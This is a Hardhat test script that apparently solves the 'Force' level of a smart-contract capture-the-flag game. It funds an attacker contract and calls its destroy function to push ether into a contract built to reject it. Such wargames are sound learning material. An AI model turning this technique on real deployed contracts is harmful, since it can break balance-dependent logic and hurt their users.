import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Force`);
    const challengeAddress = await createChallenge(
        `0x46f79002907a025599f355A04A512A6Fd45E671B`
    );
    challenge = await challengeFactory.attach(challengeAddress);
    const attackerFactory = await ethers.getContractFactory(`ForceAttacker`);
    attacker = await attackerFactory.deploy();
});

it("solves the challenge", async function () {
    console.log("attacker address: ", attacker.address);
    let tx0 = await eoa.sendTransaction({
        to: attacker.address,
        value: ethers.utils.parseUnits("10", "gwei"),
    });
    await tx0.wait();
    console.log(tx0);

    let balance = await ethers.provider.getBalance(attacker.address);
    console.log("attacker balance: ", balance);

    let tx = await attacker.destroy(challenge.address);
    await tx.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
